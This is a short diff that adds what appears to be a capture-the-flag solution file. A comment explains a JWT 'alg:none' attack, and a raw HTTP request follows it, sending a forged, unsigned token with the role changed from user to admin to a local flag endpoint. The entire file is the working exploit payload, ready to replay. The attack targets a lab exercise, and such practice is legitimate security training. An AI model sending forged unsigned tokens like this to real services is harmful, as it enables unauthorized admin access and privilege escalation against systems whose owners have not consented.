@@ -1,0 +1,5 @@
+# JWT alg:none privilege escalation. Original token has role=user. Forged token changes role=admin with no signature. Access /gettheflag to retrieve CTF flag.
+
+GET /gettheflag HTTP/1.1
+Host: 172.17.0.1:39423
+Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.
